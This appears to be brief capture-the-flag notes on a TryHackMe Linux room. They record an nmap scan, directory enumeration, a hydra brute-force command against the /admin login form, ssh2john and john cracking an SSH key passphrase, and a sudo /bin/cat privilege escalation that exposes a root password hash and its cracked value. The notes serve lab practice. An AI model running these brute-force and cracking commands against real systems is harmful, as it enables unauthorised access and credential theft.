#TryHackMe #linux 
# Scan Nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b0ebf14fa54b35c4415edb25da0ac8f (RSA)
|   256 d03a8155135e870ce8521ecf44e03a54 (ECDSA)
|_  256 dace79e045eb1725ef62ac98f0cfbb04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)

# Dirsearch Enum
[07:09:07] 301 -  306B  - /admin  ->  http://thm.brute/admin/ 

# Brute force by hydra to bypass /admin/
┌──(root㉿kali)-[~]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt thm.brute http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" -V
	pass = xavier

# john ssh private key fund after connection
#crackPass
# ssh2john on key
ssh2john key > key_hash

# Commande : john key_hach
parphrase = rockinroll

# SSH Exploit done

# PrivEsc
## Find
(root) NOPASSWD: /bin/cat
root pass_hash = "$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL."
root passord = football